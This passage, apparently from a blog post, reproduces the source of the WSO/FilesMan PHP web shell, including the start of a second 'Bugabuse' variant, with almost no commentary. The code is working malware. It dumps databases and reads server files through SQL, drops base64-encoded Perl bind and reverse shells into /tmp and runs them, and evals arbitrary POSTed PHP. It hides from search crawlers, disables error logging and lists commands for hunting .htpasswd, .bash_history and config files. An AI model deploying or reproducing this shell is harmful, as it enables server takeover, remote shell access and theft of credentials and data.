		.'&lt;td&gt;&lt;input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
		.'&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;';
	echo '&lt;/div&gt;&lt;br&gt;';
	wsoFooter();
}
 
function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this-&gt;type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this-&gt;type)	{
				case 'mysql':
					if( $this-&gt;link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this-&gt;link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this-&gt;type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this-&gt;type) {
				case 'mysql':
					return $this-&gt;res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this-&gt;res = @pg_query($this-&gt;link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this-&gt;res;
			switch($this-&gt;type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this-&gt;type)	{
				case 'mysql':
					return $this-&gt;res = @mysql_list_dbs($this-&gt;link);
				break;
				case 'pgsql':
					return $this-&gt;res = $this-&gt;query("SELECT datname FROM pg_database");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this-&gt;type)	{
				case 'mysql':
					return $this-&gt;res = $this-&gt;query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this-&gt;res = $this-&gt;query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_shadow'");
				break;
			}
			return false;
		}
		function error() {
			switch($this-&gt;type)	{
				case 'mysql':
					return @mysql_error($this-&gt;link);
				break;
				case 'pgsql':
					return @pg_last_error($this-&gt;link);
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this-&gt;type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this-&gt;link);
					else
						$this-&gt;query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this-&gt;link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this-&gt;type)	{
				case 'mysql':
					return $this-&gt;fetch($this-&gt;query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this-&gt;query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this-&gt;fetch())
						$r[] = $i['file'];
					$this-&gt;query('drop table wso2');
					return array('file'=&gt;implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table) {
			switch($this-&gt;type)	{
				case 'mysql':
					$res = $this-&gt;query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					echo $create[1].";\n\n";
					$this-&gt;query('SELECT * FROM `'.$table.'`');
					while($item = $this-&gt;fetch()) {
						$columns = array();
						foreach($item as $k=&gt;$v) {
							$item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
					echo 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
					}
				break;
				case 'pgsql':
					$this-&gt;query('SELECT * FROM '.$table);
					while($item = $this-&gt;fetch()) {
						$columns = array();
						foreach($item as $k=&gt;$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
					echo 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		ob_start("ob_gzhandler", 4096);
		$db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db-&gt;selectdb($_POST['sql_base']);
		header("Content-Disposition: attachment; filename=dump.sql");
		header("Content-Type: text/plain");
		foreach($_POST['tbl'] as $v)
				$db-&gt;dump($v);
		exit;
	}
	wsoHeader();
	echo "
&lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt; 
&lt;form name='sf' method='post'&gt;&lt;table cellpadding='2' cellspacing='0'&gt;&lt;tr&gt; 
&lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Host&lt;/td&gt;&lt;td&gt;Login&lt;/td&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;Database&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; 
&lt;input type=hidden name=a value=Sql&gt;&lt;input type=hidden name=p1 value='query'&gt;&lt;input type=hidden name=p2&gt;&lt;input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'&gt;&lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'&gt; 
&lt;td&gt;&lt;select name='type'&gt;&lt;option value='mysql' ";

    if(@$_POST['type']=='mysql')echo 'selected';

echo "&gt;MySql&lt;/option&gt;&lt;option value='pgsql' ";

if(@$_POST['type']=='pgsql')echo 'selected';

echo "&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt; 
&lt;td&gt;&lt;input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'&gt;&lt;/td&gt; 
&lt;td&gt;&lt;input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'&gt;&lt;/td&gt; 
&lt;td&gt;&lt;input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'&gt;&lt;/td&gt;&lt;td&gt;";
	$tmp = "&lt;input type=text name=sql_base value=''&gt;";
	if(isset($_POST['sql_host'])){
		if($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db-&gt;setCharset('cp1251'); break;
				case "UTF-8": $db-&gt;setCharset('utf8'); break;
				case "KOI8-R": $db-&gt;setCharset('koi8r'); break;
				case "KOI8-U": $db-&gt;setCharset('koi8u'); break;
				case "cp866": $db-&gt;setCharset('cp866'); break;
			}
			$db-&gt;listDbs();
			echo "&lt;select name=sql_base&gt;&lt;option value=''&gt;&lt;/option&gt;";
			while($item = $db-&gt;fetch()) {
				list($key, $value) = each($item);
				echo '&lt;option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'&gt;'.$value.'&lt;/option&gt;';
			}
			echo '&lt;/select&gt;';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "&lt;/td&gt; 
				&lt;td&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/td&gt; 
			&lt;/tr&gt; 
		&lt;/table&gt; 
		&lt;script&gt; 
			function st(t,l) {
				document.sf.p1.value = 'select';
				document.sf.p2.value = t;
				if(l!=null)document.sf.p3.value = l;
				document.sf.submit();
			}
			function is() {
				for(i=0;i&lt;document.sf.elements['tbl[]'].length;++i)
					document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked;
			}
		&lt;/script&gt;";
	if(isset($db) && $db-&gt;link){
		echo "&lt;br/&gt;&lt;table width=100% cellpadding=2 cellspacing=0&gt;";
			if(!empty($_POST['sql_base'])){
				$db-&gt;selectdb($_POST['sql_base']);
				echo "&lt;tr&gt;&lt;td width=1 style='border-top:2px solid #666;border-right:2px solid #666;'&gt;&lt;span&gt;Tables:&lt;/span&gt;&lt;br&gt;&lt;br&gt;";
				$tbls_res = $db-&gt;listTables();
				while($item = $db-&gt;fetch($tbls_res)) {
					list($key, $value) = each($item);
					$n = $db-&gt;fetch($db-&gt;query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "&lt;nobr&gt;&lt;input type='checkbox' name='tbl[]' value='".$value."'&gt;&nbsp;&lt;a href=# onclick=\"st('".$value."')\"&gt;".$value."&lt;/a&gt; (".$n['n'].")&lt;/nobr&gt;&lt;br&gt;";
				}
				echo "&lt;input type='checkbox' onclick='is();'&gt; &lt;input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'&gt;&lt;/td&gt;&lt;td style='border-top:2px solid #666;'&gt;";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
					$db-&gt;query('SELECT COUNT(*) as n FROM '.$_POST['p2'].'');
					$num = $db-&gt;fetch();
					$num = $num['n'];
					echo "&lt;span&gt;".$_POST['p2']."&lt;/span&gt; ($num) ";
					for($i=0;$i&lt;($num/30);$i++)
						if($i != (int)$_POST['p3'])
							echo "&lt;a href='#' onclick='st(\"".$_POST['p2']."\", $i)'&gt;",($i+1),"&lt;/a&gt; ";
						else
							echo ($i+1)," ";
					if($_POST['type']=='pgsql')
						$_POST['p3'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p3'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "&lt;br&gt;&lt;br&gt;";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
					$db-&gt;query(@$_POST['p3']);
					if($db-&gt;res !== false) {
						$title = false;
						echo '&lt;table width=100% cellspacing=0 cellpadding=2 class=main&gt;';
						$line = 1;
						while($item = $db-&gt;fetch())	{
							if(!$title)	{
								echo '&lt;tr&gt;';
								foreach($item as $key =&gt; $value)
									echo '&lt;th&gt;'.$key.'&lt;/th&gt;';
								reset($item);
								$title=true;
								echo '&lt;/tr&gt;&lt;tr&gt;';
								$line = 2;
							}
							echo '&lt;tr class="l'.$line.'"&gt;';
							$line = $line==1?2:1;
							foreach($item as $key =&gt; $value) {
								if($value == null)
									echo '&lt;td&gt;&lt;i&gt;null&lt;/i&gt;&lt;/td&gt;';
								else
									echo '&lt;td&gt;'.nl2br(htmlspecialchars($value)).'&lt;/td&gt;';
							}
							echo '&lt;/tr&gt;';
						}
						echo '&lt;/table&gt;';
					} else {
						echo '&lt;div&gt;&lt;b&gt;Error:&lt;/b&gt; '.htmlspecialchars($db-&gt;error()).'&lt;/div&gt;';
					}
				}
				echo "&lt;br&gt;&lt;textarea name='p3' style='width:100%;height:100px'&gt;".@htmlspecialchars($_POST['p3'])."&lt;/textarea&gt;&lt;br/&gt;&lt;input type=submit value='Execute'&gt;";
				echo "&lt;/td&gt;&lt;/tr&gt;";
			}
			echo "&lt;/table&gt;&lt;/form&gt;&lt;br/&gt;&lt;form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'&gt;&lt;span&gt;Load file&lt;/span&gt; &lt;input  class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;";
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db-&gt;loadFile($_POST['p2']);
				echo '&lt;pre class=ml1&gt;'.htmlspecialchars($file['file']).'&lt;/pre&gt;';
			}
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}
function actionNetwork() {
	wsoHeader();
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "&lt;h1&gt;Network tools&lt;/h1&gt;&lt;div class=content&gt; 
	&lt;form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\"&gt; 
	&lt;span&gt;Bind port to /bin/sh 1&lt;/span&gt;&lt;br/&gt; 
	Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt; 
	&lt;/form&gt; 
	&lt;form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\"&gt; 
	&lt;span&gt;Back-connect  1&lt;/span&gt;&lt;br/&gt; 
	Server: &lt;input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'&gt; Port: &lt;input type='text' name='port' value='31337'&gt; &lt;input type=submit value='&gt;&gt;'&gt; 
	&lt;/form&gt;&lt;br&gt;";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w=@fopen($f,"w") or @function_exists('file_put_contents');
			if($w)	{
				@fwrite($w,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1&gt;/dev/null 2&gt;&1 &");
			echo "&lt;pre class=ml1&gt;$out\n".wsoEx("ps aux | grep bp.pl")."&lt;/pre&gt;";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." 1&gt;/dev/null 2&gt;&1 &");
			echo "&lt;pre class=ml1&gt;$out\n".wsoEx("ps aux | grep bc.pl")."&lt;/pre&gt;";
		}
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" =&gt; php_uname(),
			"php_version" =&gt; phpversion(),
			"wso_version" =&gt; VERSION,
			"safemode" =&gt; @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
if( empty($_POST['a']) )
	if(isset($default_action) && function_exists('action' . $default_action))
		$_POST['a'] = $default_action;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
exit;
?>
{% endhighlight %}

Below is another version of the FilesMan shell &#8211; this one is the WSO Bugabuse.net edition &#8211; Modified by Led-Zeppelin.

{% highlight php %}<?php
$auth_pass = "615da5097ad7f4c7c38db0735bfb2004";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

@session_start();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('WSO_VERSION', '2.5');

if(get_magic_quotes_gpc()) {
	function WSOstripslashes($array) {
		return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
	}
	$_POST = WSOstripslashes($_POST);
}

function wsoLogin() {
	die("&lt;pre align=center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/pre&gt;");
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		wsoLogin();

if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';

$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);

$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$GLOBALS['default_use_ajax'];

if($os == 'win')
	$aliases = array(
		"List Directory" =&gt; "dir",
    	"Find index.php in current dir" =&gt; "dir /s /w /b index.php",
    	"Find *config*.php in current dir" =&gt; "dir /s /w /b *config*.php",
    	"Show active connections" =&gt; "netstat -an",
    	"Show running services" =&gt; "net start",
    	"User accounts" =&gt; "net user",
    	"Show computers" =&gt; "net view",
		"ARP Table" =&gt; "arp -a",
		"IP Configuration" =&gt; "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" =&gt; "ls -lha",
		"list file attributes on a Linux second extended file system" =&gt; "lsattr -va",
  		"show opened ports" =&gt; "netstat -an | grep -i listen",
        "process status" =&gt; "ps aux",
		"Find" =&gt; "",
  		"find all suid files" =&gt; "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" =&gt; "find . -type f -perm -04000 -ls",
  		"find all sgid files" =&gt; "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" =&gt; "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" =&gt; "find / -type f -name config.inc.php",
  		"find config* files" =&gt; "find / -type f -name \"config*\"",
  		"find config* files in current dir" =&gt; "find . -type f -name \"config*\"",
  		"find all writable folders and files" =&gt; "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" =&gt; "find . -perm -2 -ls",
  		"find all service.pwd files" =&gt; "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" =&gt; "find . -type f -name service.pwd",
  		"find all .htpasswd files" =&gt; "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" =&gt; "find . -type f -name .htpasswd",
  		"find all .bash_history files" =&gt; "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" =&gt; "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" =&gt; "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" =&gt; "find . -type f -name .fetchmailrc",
		"Locate" =&gt; "",
  		"locate httpd.conf files" =&gt; "locate httpd.conf",
		"locate vhosts.conf files" =&gt; "locate vhosts.conf",
		"locate proftpd.conf files" =&gt; "locate proftpd.conf",
		"locate psybnc.conf files" =&gt; "locate psybnc.conf",
		"locate my.conf files" =&gt; "locate my.conf",
		"locate admin.php files" =&gt;"locate admin.php",
		"locate cfg.php files" =&gt; "locate cfg.php",
		"locate conf.php files" =&gt; "locate conf.php",
		"locate config.dat files" =&gt; "locate config.dat",
		"locate config.php files" =&gt; "locate config.php",
		"locate config.inc files" =&gt; "locate config.inc",
		"locate config.inc.php" =&gt; "locate config.inc.php",
		"locate config.default.php files" =&gt; "locate config.default.php",
		"locate config* files " =&gt; "locate config",
		"locate .conf files"=&gt;"locate '.conf'",
		"locate .pwd files" =&gt; "locate '.pwd'",
		"locate .sql files" =&gt; "locate '.sql'",
		"locate .htpasswd files" =&gt; "locate '.htpasswd'",
		"locate .bash_history files" =&gt; "locate '.bash_history'",
		"locate .mysql_history files" =&gt; "locate '.mysql_history'",
		"locate .fetchmailrc files" =&gt; "locate '.fetchmailrc'",
		"locate backup files" =&gt; "locate backup",
		"locate dump files" =&gt; "locate dump",
		"locate priv files" =&gt; "locate priv"
	);

function wsoHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'&gt;&lt;title&gt;" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION ."&lt;/title&gt;
&lt;style&gt;
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
&lt;/style&gt;
&lt;script&gt;
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i&lt;d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
&lt;/script&gt;
&lt;head&gt;&lt;body&gt;&lt;div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'&gt;
&lt;form method=post name=mf style='display:none;'&gt;
&lt;input type=hidden name=a&gt;
&lt;input type=hidden name=c&gt;
&lt;input type=hidden name=p1&gt;
&lt;input type=hidden name=p2&gt;

&lt;input type=hidden name=p3&gt;
&lt;input type=hidden name=charset&gt;
&lt;/form&gt;";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}

	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i&lt;$n-1; $i++) {
		$cwd_links .= "&lt;a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j&lt;=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'&gt;".$path[$i]."/&lt;/a&gt;";
	}

	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '&lt;option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'&gt;'.$item.'&lt;/option&gt;';

	$m = array('Sec. Info'=&gt;'SecInfo','Files'=&gt;'FilesMan','Console'=&gt;'Console','Sql'=&gt;'Sql', 'PHP Tools' =&gt; 'phptools' ,'Php'=&gt;'Php','Safe mode'=&gt;'SafeMode','String tools'=&gt;'StringTools','XSS Shell'=&gt;'XSSShell','Bruteforce'=&gt;'Bruteforce','Network'=&gt;'Network');
	if(!empty($GLOBALS['auth_pass']))
		$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k =&gt; $v)
		$menu .= '&lt;th width="'.(int)(100/count($m)).'%"&gt;[ &lt;a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')"&gt;'.$k.'&lt;/a&gt; ]&lt;/th&gt;';

	$drives = "";
	if($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if(is_dir($drive.':\\'))
			$drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; ';
	}
	echo '&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname:&lt;br&gt;User:&lt;br&gt;Php:&lt;br&gt;Hdd:&lt;br&gt;Cwd:' . ($GLOBALS['os'] == 'win'?'&lt;br&gt;Drives:':'') . '&lt;/span&gt;&lt;/td&gt;'
       . '&lt;td&gt;&lt;nobr&gt;' . substr(@php_uname(), 0, 120) . ' &lt;/nobr&gt;&lt;br&gt;' . $uid . ' ( ' . $user . ' ) &lt;span&gt;Group:&lt;/span&gt; ' . $gid . ' ( ' . $group . ' )&lt;br&gt;' . @phpversion() . ' &lt;span&gt;Safe mode:&lt;/span&gt; ' . ($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=#00bb00&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;')
       . ' &lt;a href=# onclick="g(\'Php\',null,\'\',\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; ' . date('Y-m-d H:i:s') . '&lt;br&gt;' . wsoViewSize($totalSpace) . ' &lt;span&gt;Free:&lt;/span&gt; ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)&lt;br&gt;' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' &lt;a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;' . $drives . '&lt;/td&gt;'
